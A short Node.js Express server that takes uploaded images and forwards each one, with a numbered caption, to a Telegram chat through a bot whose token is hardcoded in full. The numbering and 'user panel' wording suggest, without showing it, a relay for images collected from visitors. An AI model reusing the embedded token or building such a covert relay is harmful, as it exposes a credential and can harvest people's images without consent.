const express = require("express");
const multer = require("multer");
const fetch = require("node-fetch");
const FormData = require("form-data");

const app = express();
const upload = multer();

// 🔐 TOKEN یوازې دلته
const BOT_TOKEN = "8653279537:AAF1IB0QwRhK16z59dIw7pS9p00WvysRH08";

app.post("/send", upload.single("image"), async (req, res) => {

  const chatId = req.body.chat_id;
  const count = req.body.count;

  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  const caption = `╔════════════════════════════╗
🎵 New Image Received
🌍 Country:
⏰ TimeZone: ${timezone}
💬 Image Number: ${count}
🤖 Bot: @Pro
💻 User Panel Web System
╚════════════════════════════╝`;

  const form = new FormData();
  form.append("chat_id", chatId);
  form.append("caption", caption);
  form.append("photo", req.file.buffer, {
    filename: "image.jpg"
  });

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: form
  });

  res.send("OK");
});

app.listen(3000, () => {
  console.log("Server running...");
}); 
